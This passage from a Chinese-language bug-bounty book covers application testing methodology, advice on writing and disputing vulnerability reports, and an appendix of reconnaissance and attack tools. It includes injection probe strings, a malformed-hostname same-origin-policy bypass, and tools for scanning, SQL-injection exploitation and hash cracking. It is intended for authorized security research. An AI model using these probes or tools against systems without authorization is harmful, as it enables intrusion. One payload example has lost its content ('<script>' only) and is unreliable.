寻找有趣内容的另一种方法是检查公司的 `GitHub`。你可能会发现公司的开源仓库，或关于其所用技术的有用信息。这就是 `Michiel Prins` 在第 12 章中讨论的在 `Algolia` 上发现远程代码执行的方法。你可以使用 `Git` 工具爬取 `GitHub` 仓库以寻找应用程序密钥和其他敏感信息。此外，你可以审查代码库并找到应用程序依赖的第三方库。如果你能找到一个遗弃的项目或影响网站的第三方漏洞，这两者都可能获得漏洞赏金。代码库还可以让你了解公司如何处理之前的漏洞，特别是对于像 `GitLab` 这样开源的公司。

## 之前的漏洞

侦察的最后步骤之一是熟悉之前的漏洞。黑客写的报告（`write-ups`）、披露的报告、`CVE`、已发布的利用等都是很好的资源。正如本书中所反复强调的，代码被更新了并不意味着所有漏洞都已修复。如第 12 章所述，`Tanner Em` 在 `Shopify` 中发现的结果……

在测试时，请记住侦察是寻找赏金的持续性工作。在涵盖了侦察的所有主要领域后，是时候进入测试阶段。

# 测试应用程序

测试应用程序没有一种通用的方法。你使用的方法和技术取决于你正在测试的应用程序类型。在本节中，我将对你需要考虑的考量和需要使用的思维过程提供一个概述。但无论你测试的是什么应用程序，没有比 `Matthias Karlsson` 的建议更好的了：“不要认为其他人已经看过了，没什么剩下的了。像以前没人看过一样对待每一个目标。没发现？就换另一个。”

## 技术栈

测试新应用程序时，我做的首要任务之一是识别所使用的技术。这包括但不限于前端 `JavaScript` 框架、后端应用程序框架、第三方服务、本地托管文件、远程文件等。我通常通过查看我的 Web 代理历史并记录提供的文件、历史记录中的域名、是否提供了 `HTML` 模板、是否返回了 `JSON` 等来完成。`Firefox` 插件 `Wappalyzer` 对于快速识别技术指纹也非常方便。

如果 `API` 返回 `JSON` 或 `XML`，你可能会发现这些调用在无意中返回了未在页面渲染的敏感信息。这些调用可能是很好的测试切面，并可能导致信息泄露漏洞。

在此阶段，请记住以下因素：

- 网站预期或接受的内容格式：例如，`XML` 文件有不同的形状和大小，而 `XML` 解析始终与 `XXE` 漏洞相关。密切关注接受 `.docx`、`.xlsx`、`.pptx` 或其他 `XML` 文件类型的网站。
- 容易配置错误的第三方工具或服务：每当你读到关于利用这些服务的报告时，尝试去理解这些报告者是如何发现漏洞的，并将该过程应用到你的测试中。
- 经过编码的参数以及应用程序处理它们的方式：异常情况可能预示着后端有多个服务在交互，这可能会被滥用。
- 自定义实现的身份验证机制（例如 `OAuth` 流程）：应用程序处理重定向 URL、编码和状态参数时的细微差异可能会导致严重的漏洞。

## 功能映射

一旦我了解了网站的技术栈，就会进入功能映射阶段。在这个阶段，我仍然在浏览，但我的测试可以向以下几种方向进行：我可能会寻找漏洞标记，为我的测试定义特定目标，或者遵循检查清单。

当我寻找漏洞标记时，我会寻找通常与漏洞相关的行为。例如，该网站允许你创建带有 URL 的 `webhooks` 吗？如果是，这可能导致 `SSRF` 漏洞。网站允许用户冒充吗？这可能导致敏感信息泄露。你可以上传文件吗？这些文件如何以及何处被渲染可能会导致远程代码执行漏洞、`XSS` 等。当我发现感兴趣的内容时，我会停止并开始应用程序测试（如下一节所述），并寻找漏洞的迹象。这可能是返回了意外之外的消息、响应时间的延迟、返回了未过滤的输入，或绕过了服务器端的检查。

相比之下，当我定义并朝着一个目标努力工作时，我会在测试应用程序之前决定要做什么。目标可能是寻找服务端请求伪造（`SSRF`）、本地文件包含、远程代码执行或其他漏洞。`HackerOne` 的联合创始人 `Jacob Abma` 经常采用并提倡这种方法，`Philippe Harewood` 在发现他的 `Facebook` 应用被接管时使用了这种方法。通过这种方法，忽略所有其他可能性，完全专注于你的最终目标。只有当你发现能通往目标的内容时，才会停止并开始测试。例如，如果你正在寻找远程代码执行漏洞，响应体中返回的未过滤的 `HTML` 对你来说就没有意义。

另一种测试方法是遵循检查清单。`OWASP` 和 `Dafydd Stuttard` 的《Web Application Hacker's Handbook》都提供了审查应用程序的全面测试清单，因此我没有理由尝试超越其中任何一个资源。我不遵循这条路，因为这太单调了，让人联想到的是工作而不是一种愉快的爱好。尽管如此，遵循检查清单可以帮助你避免因忘记测试特定内容或忘记遵循通用方法（如审查 `JavaScript` 文件）而遗漏漏洞。

## 寻找漏洞

一旦你了解了应用程序是如何运作的，就可以开始测试了。与其设定特定目标或使用检查清单，我建议从寻找可能指示漏洞的行为开始。在这个阶段，你可能认为自己应该运行自动化扫描器，如 `Burp` 的扫描引擎来寻找漏洞。但我看过的大多数程序都不允许这样做，这会产生不必要的噪音，不需要任何技能或知识。相反，你应该专注于手动测试。

如果我在功能映射期间没有发现任何有趣的可以看的内容就开始了应用程序测试，那么我会像客户一样使用该网站。我会创建内容、用户、团队或应用程序提供的任何东西。在执行过程中，我通常会在接受输入的地方提交 `payload`，并寻找网站的异常和意外行为。我通常使用 `payload` `<script>`，它包含了所有可能破坏 `payload` 渲染上下文的特殊字符，无论该上下文是 `HTML`、`JavaScript` 还是后端 `SQL` 查询。这种 `payload` 通常被称为“多语言攻击”（`polyglot`）。`<svg>` 标签也是无害的，在 `HTML` 中渲染未过滤的内容时很容易发现（当发生这种情况时你会看到删除线文本），而且当网站尝试通过更改输入来清理输出时，它经常被保持原样。

此外，我创建的内容可能会被渲染在管理面板上（例如用户名、地址等），我将使用不同的 `payload` 针对来自 `XSSHunter`（附录 A 中讨论的工具）的盲目 `XSS` 进行攻击。最后，如果网站使用模板引擎，我还会添加与模板相关的 `payload`。对于 `AngularJS`，这看起来会像 `{{8*8}}[[5*5]]`，我会寻找被渲染的 64 或 25。虽然我从未在 `Rails` 中发现过服务端模板注入，但我仍然尝试使用 `payload` `<%='Is' %>`，以防某天内联渲染器显示出它。

尽管提交此类 `payload` 涵盖了注入类漏洞（如 `XSS`、`SQLi`、`SSTI` 等），但它不需要太批判性思维，并且会很快变得重复且无味。因此，为了避免遗漏，密切关注你的代理历史，寻找通常与漏洞相关的异常功能。常见的漏洞和需要关注的领域包括但不限于以下：

- `CSRF` 漏洞：更改数据的 HTTP 请求类型，以及它们是否使用了并验证了令牌或源头（`origin headers`）
- `IDOR`：是否存在可以被操纵的 `ID`
- 应用程序逻辑：在不同账户之间重复请求的机会
- `XXE`：任何接受 `XML` 的 HTTP 请求
- 信息泄露：任何保证或应该保密的内容
- 开放重定向：任何重定向的 URL
- `CRLF`、`XSS` 以及某些开放重定向：在参数中添加单引号、括号或分号产生的结果
- `RCE`：任何类型的文件上传或图像处理
- 竞态条件：与时间相关的延迟处理
- `SSRF`：接受 URL 的功能，如 `webhooks` 或外部集成
- 未修补的安全漏洞：披露的服务器信息，例如 `PHP`、`Apache`、`Nginx` 等版本，这些可以揭示过时的

当然，这个列表是无尽的且不断演变的。当你需要更多搜寻灵感时，可以随时查看每一章的总结。

## 效率建议

受限于时间。要突破时间屏障，你需要计算机来替你进行攻击。`Rojan Rijal` 在他发现漏洞的子域名上线五分钟内，就公开了他发现的 `Shopify` 漏洞。他之所以能如此快速地发现，是因为他自动化了对 `Shopify` 的侦察（`recon`）。如何自动化你的攻击超出了本书的范畴——而且即使不自动化也完全可能成为成功的赏金黑客——但这是黑客增加收入的一种方式。你可以从自动化你的侦察开始。例如，你可以自动化多个任务，如子域名爆破、端口扫描和视觉侦察等。

### 查看移动应用

发现更多漏洞的另一个机会是查看程序范围内的任何移动应用程序。本书侧重于 Web 攻击，但移动端攻击提供了许多发现漏洞的新机会。你可以通过两种方式之一攻击移动应用：直接测试应用程序代码，或者测试应用与其交互的 `API`。我重点关注后者，因为它与 Web 攻击类似，并且我可以专注于 `IDOR`、`SQLi`、`RCE` 等漏洞类型。要开始测试移动应用 `API`，你需要在通过 `Burp` 使用应用程序时对手机流量进行代理。这是查看所发出的 HTTP 请求的一种方法，这样你就可以对它们进行操作。但有时应用会使用 `SSL` 钉（`SSL pinning`），这意味着它不会识别或使用 `Burp` 的 `SSL` 证书，因此你无法代理应用的流量。绕过 `SSL` 钉、代理手机以及通用的移动攻击都超出了本书的范围，但它们确实代表了学习的绝佳机会。

### 识别新功能

下一个关注的领域是识别正在测试的应用程序中添加的新功能。`Philippe Harewood` 是掌握这项技能的绝佳范例。在 `Facebook` 计划中排名靠前的黑客中，他经常在自己的网站（`https://philippeharewood.com/`）上公开分享他发现的漏洞。他的报告通常会引用他发现的新功能，以及由于他的快速识别而比他人更早发现的漏洞。`Frans Rosen` 在 `Detectify` 博客（`https://blog.detectify.com/`）上分享了他识别新功能的一些方法。要跟踪你正在测试的网站上的新功能，你可以阅读你测试网站的工程博客，监控他们的工程 `Twitter Feed`，订阅他们的通讯邮件等。

### 跟踪 JavaScript 文件

你也可以通过跟踪 `JavaScript` 文件来发现网站的新功能。当网站依赖前端 `JavaScript` 框架来渲染内容时，专注于 `JavaScript` 文件会特别有效。应用程序将依赖于将其使用的大部分 HTTP 端点包含在其 `JavaScript` 文件中。文件中的更改可能代表你可以测试的新功能或更改的功能。`Jobert Abma`、`Brett Buerhaus` 和 `Ben Sadeghipour` 讨论了他们如何跟踪 `JavaScript` 文件的方法；你可以通过在 `Google` 上快速搜索他们的名字和“reconnaissance”（侦察）一词来找到他们的报告。

### 为访问新功能付费

尽管当你正试图通过赏金获利时，这听起来可能违背直觉，但你也可以通过付费获取某些功能的访问权限。`Frans Rosen` 和 `Ron Chan` 讨论了他们通过付费获取新功能而所享的成功。例如，`Ron Chan` 支付了数千美元测试一个应用程序，并发现了大量的漏洞，使得这笔投资非常值得。我也通过购买产品、订阅和服务成功地扩大了我的潜在测试范围。其他人可能并不愿意为他们不使用的网站功能付费，因此这些功能拥有更多未被发现的漏洞。

### 学习技术

此外，你可以研究已知公司正在使用的技术、库和软件，并详细学习它们的工作原理。你对某项技术的工作原理越了解，就越可能根据它在测试的应用程序中的使用方式发现漏洞。例如，在第 12 章中发现 `ImageMagick` 漏洞需要理解 `ImageMagick` 及其定义文件类型是如何工作的。你可能通过查看与 `ImageMagick` 等库相关的其他技术来发现额外的漏洞。`Tavis Ormandy` 在公开 `Ghostscript` 的额外漏洞时就是这样做的，`ImageMagick` 支持 `Ghostscript`。你可以在此处找到关于这些 `Ghostscript` 漏洞的更多信息：`https://www.openwall.com/lists/oss-security/2018/08/21/2`。

同样，`FileDescriptor` 在一个博文中透露，他会阅读关于 Web 功能的 `RFC` 并关注安全考量，以理解某功能本应该是如何工作的，以及它实际上是如何实现的。他对 `OAuth` 的深厚知识是他深入研究许多网站使用的技术的绝佳例子。

## 总结

在本章中，我尝试根据自己的经验以及对顶级漏洞赏金黑客的采访，阐明了攻击的可能方法。到目前为，我在探索目标、理解其提供的功能并将该功能映射到漏洞类型以进行测试后，取得了最大的成功。但我继续探索（并鼓励你也去研究）的领域是自动化和记录你的方法论。

有很多黑客工具可以让你的生活更轻松：`Burp`、`ZAP`、`Nmap` 和 `Gowitness` 是我提到过的一些。为了更好地利用你的时间，在攻击时记住这些工具。

当你用尽了用于寻找漏洞的常用途径后，请通过深入挖掘移动应用程序和你正在测试的网站上开发的新功能，寻找让漏洞搜索成功的方法。

# 20 个漏洞报告

所以，你找到了第一个漏洞。恭喜你！发现漏洞可能是困难的。我的第一个建议是放松心情，不要操之过急。当你急忙时，往往会犯错。相信我——我知道那种兴奋地提交漏洞结果却被拒绝的感觉如何。雪上加霜的是，当公司将报告标记为无效时，赏金平台会减少你的声誉分。本章将通过提供编写良好报告的技巧帮助你避免这种情况。

## 阅读策略

在提交漏洞之前，请确保查看程序策略。每个参与赏金平台的公司都会提供一份策略文档，其中通常列出了排除的漏洞类型以及属性是否在范围内。在黑客之前务必阅读公司的策略，以避免浪费时间。如果你还没有读某个程序的策略，现在就读，以确保你不是在寻找已知问题或公司要求不要报告的漏洞。

这里我曾犯过的一个痛苦错误，是因为我没有读策略。我发现的第一个漏洞是在 `Shopify`。我意识到如果你在文本编辑器中提交格式错误的 `HTML`，`Shopify` 的解析器会修正它并存储为 `XSS`。我非常兴奋。我以为我的漏洞猎取有了回报，提交报告的速度快得不得了。

提交报告后，我等待着 500 美元的最低赏金。提交五分钟后，程序就礼貌地告诉我该漏洞是已知的，并研究人员不要提交。工单被关闭为无效报告，我失去了五个声誉分。这是一个惨痛的教训。

从我的错误中吸取教训；阅读策略。

## 编写报告

一旦你阅读了策略并确认你的漏洞在范围内，就可以开始编写报告了。一个好的漏洞报告应该包含以下内容：

- 漏洞标题
- 漏洞类型
- 受影响的 URL 或端点
- 复现步骤
- 对影响的解释，包括漏洞可能如何被利用
- 用于修复漏洞的建议方案

我建议你以截图或不超过两分钟的短视频形式提供漏洞证明。概念证明（`Proof-of-concept`）材料不仅提供了你发现结果的记录，而且在演示如何复现漏洞时也很有帮助。

在准备报告时，你还需要考虑漏洞的影响。例如，考虑到公司的一家上市公司、人们对该平台的信任度等因素，`Twitter` 上的存储型 `XSS` 是一个严重的问题。相比之下，没有用户账户的网站可能认为存储型 `XSS` 的严重性较低。相反，在一家托管个人健康记录的敏感网站上发生隐私泄露，其重要性可能高于 `Twitter`，因为 `Twitter` 上的大部分用户信息已经是公开的。

## 重新确认漏洞

在阅读完公司政策、起草报告并包含概念证明材料后，请花一点时间思考一下你所报告的内容是否真的是漏洞。例如，如果你因为没有在 HTTP 请求体中看到令牌而报告了 `CSRF` 漏洞，请检查该参数是否是通过 `Header`（请求头）传递的。

2016 年 3 月，`Mathias Karlsson` 写了一篇很棒的博客，介绍了发现同源策略（`SOP`）绕过的方法（`https://labs.detectify.com/2016/03/17/bypassing-sop-and-shouting-hello-before-you-cross-the-pond/`）。但他没有获得报酬，`Karlsson` 在他的博客中引用了瑞典谚语“过河前不要大声打招呼”，意思是是在百分之百确定成功之前不要庆祝。

根据 `Karlsson` 的说法，他当时正在测试 `Firefox`，并注意到浏览器在 `macOS` 上会接受格式错误的主机名。具体来说，URL `http://example.com..` 会加载 `example.com`，但在 `host header` 中发送 `example.com..`。然后他尝试访问 `http://example.com...evil.com` 并得到了相同的结果。这意味着绕过 `SOP`，因为 `Flash` 会将 `http://example.com...evil.com` 视为 `*.evil.com` 域名。他检查了 `Alexa` 前 10,000 个网站，发现 7% 的网站是可以被利用的，包括 `yahoo.com`。

他写下了这个漏洞，但随后决定与同事再次检查该问题。他们使用了另一台电脑并复现了漏洞。他更新了 `Firefox` 仍然确认了该漏洞。他推特了一个关于该漏洞的预告。然后他意识到自己的错误。他没有更新操作系统。更新之后，漏洞消失了。显然，他注意到的这个问题六个月前就被报告并修复了。

`Karlsson` 是顶尖的赏金黑客之一，但即使是他也几乎犯了一个尴尬的错误。请确保在报告漏洞之前确认你的漏洞。如果你认为自己发现了一个重大漏洞，结果却发现误解了应用程序并提交了无效报告，那种感觉是非常沮丧的。

## 你的声誉

每当你考虑提交漏洞时，请后退一步问问自己，你是否会对公开披露这份报告感到自豪。

当我开始做黑客时，我提交了大量的报告，因为我想提供帮助并登上排行榜。但实际上，我只是通过编写无效的报告在浪费大家的时间。不要犯同样的错误。

你可能不在乎自己的声誉，或者你可能认为公司可以筛选提交的报告以找到有意义的漏洞。但在所有赏金平台上，你的统计数据至关重要。它们会被追踪，公司会利用它们来决定是否邀请你参加私人计划。此类计划通常对黑客来说更有利，因为参与的黑客少，意味着竞争更小。

这里我经验中的一个例子：我被邀请参加一个私人计划，并在一天内发现了八个漏洞。但那天晚上我向另一个计划提交了报告，结果被判定为 `N/A`（无效）。该报告降低了我在 `HackerOne` 上的数据。因此，当我第二天向另一个私人计划报告另一个漏洞时，被告知我的统计数据太低，必须等待 30 天才能报告我发现的漏洞。等待这 30 天并不好玩。我很幸运——没有其他人发现那个漏洞。但我错误的后果教了我要重视在所有平台上的声誉。

## 尊重公司

尽管很容易忘记，但并非所有公司都有资源立即响应报告或整合漏洞修复。在编写报告或进行跟进时，请记住公司的观点。

当一家公司启动新的公开赏金计划时，它将收到大量需要分拣的报告。在你开始询问更新之前，请给公司一些时间回复你。某些公司政策包含了服务水平协议（`SLA`），并承诺在给定的时间内回复报告。克制你的兴奋，考虑公司的工作量。对于新报告，预计在五个工作日内收到回复。之后，你通常可以发布一条礼貌的评论来确认报告状态。大多数情况下，公司会回复并让你知道情况。如果他们没有回复，在再次尝试或将问题升级到平台之前，你应该再给他们几天时间。

另一方面，如果公司已经确认了报告中的漏洞，你可以询问修复的预计时间表以及你是否会收到更新。你也可以询问是否可以在一个月或两个月后再次查看。开放的沟通是你希望继续合作的计划的指标；如果公司没有回应，最好转向另一个计划。

在写这本书期间，我有幸在 `Adam Bacchus` 供职 `Snapchat` 期间与他聊了天。他也曾在 `Google` 的漏洞团队工作过，在那里他致力于弥合安全与工程之间的差距。`Bacchus` 分享了这些见解，帮助我理解分拣人员面临的问题：

- 尽管赏金计划不断改进，但它们会收到无效报告，这增加了分拣人员的工作。
- 赏金计划希望黑客回来。正如 `HackerOne` 所描述的，随着黑客向同一个计划提交更多漏洞，严重程度通常会增加。这被称为“深耕”。
- 糟糕的声誉是真实的。计划总是面临误判漏洞、修复时间过长或授予黑客认为过低的奖励的风险。此外，当黑客认为发生了这种情况时，会在社交媒体和传统媒体上批评计划。这些风险影响分拣人员的工作方式以及与黑客建立的关系。
- 在复杂系统中验证报告需要时间。因此，编写清晰的描述和复现步骤很重要。当分拣人员需要额外信息来验证和复现漏洞时，会延迟修复。
- 并非所有公司都有专门的人员运行赏金计划。小型公司可能在计划与其他开发任务之间分配时间。因此，某些公司的反应较慢。
- 修复漏洞需要时间，特别是公司经历整个开发周期时。为了整合修复，公司可能需要经过调试、编写测试和阶段等步骤。即使在客户依赖的系统中低影响漏洞，这些过程也会缓慢修复。计划可能需要更长时间来确定正确的修复。但这正是清晰沟通和相互尊重的地方。

## 申诉奖励

当你向支付赏金的公司提交漏洞时，尊重他们对奖励金额的决定，但不要害怕与公司沟通。在 `Quora` 上，`HackerOne` 的联合创始人 `Jobert Abma` 就赏金分歧分享了以下内容（`https://www.quora.com/How-do-I-become-successful-Bug-bounty-hunter/`）：

如果你对收到的金额有异议，讨论你认为它应该获得更高的奖励。避免在没有说明你为何认为该成立的情况下就给予奖金。作为回报，公司应该尊重你的时间和价值。

礼貌地询问为什么某个报告被授予了特定金额是完全可以的。我过去这样做时，通常会使用以下评论：

> 非常感谢赏金。我对此非常感谢。我很好奇这个金额是如何确定的。我原本预期是 $X，但你们授予了 $Y。我认为这个漏洞可以用来[利用 Z]，这会对你们的[系统/用户]产生重大影响。我希望你们能帮助我理解，以便我将来能将更多精力放在对你们最重要的事情上。

作为回应，公司采取了以下措施：

- 解释报告的影响比我想象的要低，且没有更改金额
- 承认他们误读了我的报告并增加了金额
- 承认他们对我的报告进行了分类错误，并在纠正后增加了金额

如果某公司已经公布了涉及相同类型漏洞或影响与你的奖金预期一致的报告，你也可以在跟进时引用该报告，以说明你的预期。但我建议你只引用同一家公司的报告。不要引用不同公司更高额的报酬，因为 `A` 公司提供的赏金并不一定意味着 `B` 公司也应该提供同样的金额。

## 总结

了解如何编写优秀的报告并交流你的发现是成功的漏洞赏金黑客的一项技能。阅读计划策略至关重要，确定在报告中包含哪些细节也是如此。一旦你发现了漏洞，重新确认你的发现以避免提交无效报告至关重要。即使是像 `Mathias Karlsson` 这样优秀的黑客也会有意识地避免犯错。

一旦你提交了报告，请对处理潜在漏洞的人产生同理心。在与公司合作时，请记住 `Adam Bacchus` 的见解。如果你获得了赏金但觉得金额不合适，最好是进行礼貌的对话，而不是在 `Twitter` 上发泄情绪。

你写的所有报告都会影响你在漏洞赏金平台上的声誉。保护好你的声誉很重要，因为平台根据你的统计数据来决定是否邀请你参加私有计划，在那里你可能对你的黑客投资获得更高的回报。

# 附录 A 工具

本附录包含了一个黑客工具清单。其中一些工具允许你自动化侦测过程，另一些工具则帮助你发现可以攻击的应用程序。此列表并非详尽的；它仅反映了我常用的工具，或者我知道其他黑客经常使用的工具。还要记住，这些工具都不应取代观察或直觉思维。`HackerOne` 的创始人 `Michiel Prins` 开发了此列表的初始版本，并在我开始学习黑客时提供了如何有效使用工具的建议。

## Web 代理

Web 代理捕获你的网络流量，以便你可以分析发送的请求和接收的响应。其中几个工具是免费提供的，尽管此类工具的专业版本具有额外功能。

### Burp Suite

`Burp Suite` (`https://portswigger.net/`) 是一个用于安全测试的集成平台。平台上最有用的工具（也是我 90% 时间使用的工具）是 `Burp` 的 Web 代理。正如书中的漏洞报告，代理允许你监控流量、实时拦截请求、修改它们然后转发。`Burp` 拥有一系列工具，但这些是我认为最值得关注的：

- 一个感知应用程序的 `Spider`，用于爬取内容和功能（被动或主动）
- 用于自动化漏洞检测的 Web 扫描器
- 用于操作和重发单个请求的 `Repeater`
- 用于在平台上构建额外功能的扩展程序

`Burp` 提供免费版，对工具的访问有限，但你也可以购买订阅版的 `Pro` 版本。我建议在理解如何使用它之前从免费版开始。当你稳定地发现漏洞时，购买 `Pro` 版会让你的生活更轻松。

### Charles

`Charles` (`https://www.charlesproxy.com/`) 是一个 `HTTP` 代理、`HTTP Monitor` 和反向代理工具，允许开发者查看 `HTTP` 和 `SSL/HTTPS` 流量。通过它，你可以查看请求、响应和 `HTTP Header`（包含 `Cookie` 和缓存信息）。

### Fiddler

`Fiddler` (`https://www.telerik.com/fiddler/`) 是另一个你可以用来监控流量的轻量代理，但稳定版本仅适用于 `Windows`。在本文写作时，`Mac` 和 `Linux` 版本尚处于测试阶段。

### Wireshark

`Wireshark` (`https://www.wireshark.org/`) 是一个网络协议分析器，让你详细看到网络上发生的情况。当你尝试监控无法通过 `Burp` 或 `ZAP` 代理的流量时，`Wireshark` 最有用。如果你刚开始学习，且网站仅通过 `HTTP/HTTPS` 通信，使用 `Burp Suite` 可能是最好的。

### ZAP Proxy

`OWASP Zed Attack Proxy` (`ZAP`) 是一个免费、基于社区的开源平台，类似于 `Burp`。它可以在 `https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project` 获取。它还有各种工具，包括代理、重发器、扫描器、目录/文件破解器等。此外，它还支持插件，如果你有兴趣，可以创建额外功能。该网站有一些实用的入门资源。

## 子域名枚举

Web 通常拥有难以通过手动发现的子域名。对子域名进行暴力破解可以帮助你识别程序的攻击面。

### Amass

`OWASP Amass` 工具 (`https://github.com/OWASP/Amass`) 通过抓取数据源、使用递归暴力破解、爬取网络存档、遍历以及反向 DNS 扫描获取子域名名称。它还利用解析获得的 IP 地址来发现相关的区块和自治系统编号 (`ASN`)。

### crt.sh

`crt.sh` 网站 (`https://crt.sh/`) 允许你浏览证书日志，以便找到证书相关的子域名。证书注册可以暴露网站使用的其他子域名。你可以直接使用该网站，也可以使用解析 `crt.sh` 结果的工具。

### Knockpy

`Knockpy` (`https://github.com/guelfoweb/knock/`) 是一个 `Python` 工具，旨在通过遍历字典列表来识别公司的子域名。识别子域名可以提供更大的测试面，并增加发现漏洞的机会。

### SubFinder

`SubFinder` (`https://github.com/subfinder/subfinder/`) 是一个用 `Go` 编写的子域名发现工具，通过被动源在线发现有效的子域名。它具有简单的模块架构，旨在替代类似的工具 `Sublist3r`。`SubFinder` 使用被动源、搜索引擎、粘贴板、网络存档等发现子域名。当它发现子域名时，使用受 `altdns` 工具启发的变体模块生成变体，并使用强大的破解引擎进行解析。该工具高度可定制，代码采用模块化方法构建，便于添加功能和消除错误。

## 发现

当你确定了程序的攻击面后，下一步是枚举文件和目录。这样做可以帮助你找到隐藏的功能、敏感文件、凭据等。

### Gobuster

`Gobuster` (`https://github.com/oj/gobuster/`) 是一个你可以使用通配符支持暴力破解 `URI`（目录和文件）以及 `DNS` 子域名的工具。它极快、可定制且易于使用。

### SecLists

虽然技术上本身不是一个工具，但 `SecLists` (`https://github.com/danielmiessler/SecLists/`) 是一个集合，可以在黑客攻击时使用的词汇列表。这些列表包含了用户名、密码、`URL`、模糊测试字符串、常见的目录/文件/子域名等。

### Wfuzz

`Wfuzz` (`https://github.com/xmendez/wfuzz/`) 允许你在 `HTTP` 请求的任何字段中注入任何输入。通过 `Wfuzz`，你可以对 Web 应用的不同组件进行复杂攻击，例如参数、身份验证、表单、目录或文件、标头等。在有插件支持的情况下，你还可以将 `Wfuzz` 作为漏洞扫描器。

## 截图

在某些情况下，你的攻击面会太大，以至于无法测试它的每一个方面。当你需要检查很长的网站或子域名列表时，可以使用自动截图工具。这些工具允许你在无需访问每个网站的情况下视觉化检查网站。

### EyeWitness

`EyeWitness` (`https://github.com/FortyNorthSecurity/EyeWitness/`) 旨在为网站截图、提供服务器标头信息，并尽可能识别默认凭据。它是检测常用 `HTTP` 和 `HTTPS` 端口上运行哪些服务的极佳工具，你可以配合 `Nmap` 等其他工具使用它来快速枚举黑客目标。

### Gowitness

`Gowitness` (`https://github.com/sensepost/gowitness/`) 是用 `Go` 编写的网站截图工具。它使用 `Chrome Headless` 通过命令行生成 Web 界面的截图。该项目的灵感源于 `EyeWitness` 工具。

### HTTPScreenShot

`HTTPScreenShot` (`https://github.com/breenmachine/httpscreenshot/`) 是一个用于获取大量网站截图和 `HTML` 的工具。`HTTPScreenShot` 接受 IP 作为截图的 `URL` 列表。它还可以破解子域名，将其添加到待截图 `URL` 列表中，并对结果进行聚类以便审查。

## 端口扫描

除了寻找 `URL` 和子域名，你还需要弄清哪些端口是可用的以及服务器运行哪些应用程序。

### Masscan

`Masscan` (`https://github.com/robertdavidgraham/masscan/`) 声称是世界上最快的互联网端口扫描器。它可以在六分钟内扫描整个互联网，每秒传输 1000 万个包。它产生的结果与 `Nmap` 类似，但速度更快。此外，`Masscan` 允许你扫描任意地址范围和端口范围。

### Nmap

`Nmap` (`https://nmap.org/`) 是一个用于网络发现和安全审计的免费开源工具。`Nmap` 使用原始 `IP` 数据包来确定：

- 网络上哪些主机是可用的
- 这些主机提供哪些服务（以及应用程序名称和版本）
- 它们运行什么操作系统（以及版本）
- 正在使用什么类型的数据包过滤器或防火墙

`Nmap` 网站提供了针对 `Windows`、`Mac` 和 `Linux` 的详尽安装说明列表。除了端口扫描外，`Nmap` 还包含用于构建额外功能的脚本。我经常使用的一个脚本是 `http-enum`，用于在对服务器进行端口扫描后枚举服务器上的文件和目录。

## 侦察

在你找到可以测试的网站的 `URI`、子域名和端口后，你需要更多地了解它们使用的技术以及它们连接的互联网其他部分。以下工具将帮助你完成这一点。

### BuiltWith

`BuiltWith` (`http://builtwith.com/`) 帮助识别目标上使用的不同技术指纹。根据其网站显示，它可以检查超过 18,000 种互联网技术，包括分析、托管、`CMS` 类型等。

### Censys

`Censys` (`https://censys.io/`) 通过每天对 `IPv4` 地址空间进行 `ZMap` 和 `ZGrab` 扫描来收集主机和网站的数据。它维护了一个关于主机和网站配置的数据库。遗憾的是，`Censys` 最近实施了付费模式，对于大规模黑客攻击来说非常昂贵，但免费层仍然很有帮助。

### Google Dorks

`Google Dorking` (`https://www.exploit-db.com/google-hacking-database/`) 指使用 `Google` 提供的高级语法来寻找在手动浏览网站时无法轻易获得的信息。这些信息可能包括发现漏洞文件、外部资源加载的机会以及其他攻击面。

### Shodan

`Shodan` (`https://www.shodan.io/`) 是一个物联网的搜索引擎。`Shodan` 可以帮助你发现哪些设备连接到了互联网、它们位于何处以及谁在使用它们。当你正在探索潜在目标并尝试尽可能学习关于目标基础设施的信息时，这特别有帮助。

### What CMS

`What CMS` (`http://www.whatcms.org/`) 允许你输入 `URL` 并返回该网站最可能使用的内容管理系统 (`CMS`)。找到网站使用的 `CMS` 类型是有帮助的，因为：

- 了解网站使用什么 `CMS` 可以让你深入网站代码的结构。
- 如果 `CMS` 是开源的，你可以浏览代码寻找漏洞并在网站上进行测试。
- 网站可能过时，并且容易受到已知的安全漏洞的影响。

## 黑客工具

使用黑客工具，你不仅可以自动化发现和枚举过程，还可以自动化寻找漏洞的过程。

### Bucket Finder

`Bucket Finder` (`https://digi.ninja/files/bucket_finder_1.1.tar.bz2`) 搜索可读的桶并列出其中所有的文件。它还可以快速找到存在但不允许你列出文件的桶。当你发现这些类型的桶时，可以尝试漏洞报告第 223 页中“HackerOne S3 Buckets”描述的 `AWS CLI`。

### CyberChef

`CyberChef` (`https://gchq.github.io/CyberChef/`) 是编码和解码工具的瑞士军刀。

### Gitrob

`Gitrob` (`https://github.com/michenriksen/gitrob/`) 帮助你发现推送到 `GitHub` 的潜在敏感文件。`Gitrob` 将属于用户或组织的仓库克隆到配置的深度，并遍历提交历史，标记与敏感文件签名匹配的文件。它通过 Web 界面展示发现的结果，以便浏览和分析。

### Online Hash Crack

`Online Hash Crack` (`https://www.onlinehashcrack.com/`) 尝试恢复哈希形式的密码、`WPA dump` 和 `MS Office` 加密文件。它支持识别 250 多种哈希类型，当你想识别网站使用的哈希类型时非常有用。

### sqlmap

你可以使用开源渗透工具 `sqlmap` (`http://sqlmap.org/`) 来自动化检测和利用 `SQL` 注入漏洞的过程。该网站有一个功能列表，包括支持：

- 广泛的数据库类型，例如 `MySQL`、`Oracle`、`PostgreSQL`、`MS SQL Server` 等
- 六种 `SQL` 注入技术
- 用户、密码、权限、数据库、表和列枚举

### XSSHunter

`XSSHunter` (`https://xsshunter.com/`) 帮助你发现盲 `XSS` 漏洞。注册 `XSSHunter` 后，你会获得一个 `xss.ht` 短域名，用于识别你的 `XSS` 并托管有效负载。当 `XSS` 触发时，它会自动收集发生的信息并向你发送邮件通知。

### Yoserial

`Yoserial` (`https://github.com/frohoff/ysoserial/`) 用于生成利用 `Java` 对象反序列化的负载的演示工具。

## 移动端

虽然书中的大多数漏洞都是通过浏览器发现的，但在某些情况下，你需要在测试中分析移动应用。能够拆解和分析应用的组件将帮助你了解它们的工作原理以及它们可能存在的漏洞。

### dex2jar

`dex2jar` (`https://sourceforge.net/projects/dex2jar/`) 一组移动黑客工具，将 `dalvik` 执行文件 (`.dex` 文件) 转换为 `Java` `.jar` 文件，这使得审计 `Android APK` 变得更容易。

### Hopper

`Hopper` (`https://www.hopperapp.com/`) 是一款反向工程工具，允许你反汇编、反编译和调试应用程序。它对于审计 `iOS` 非常有用。

### JD-GUI

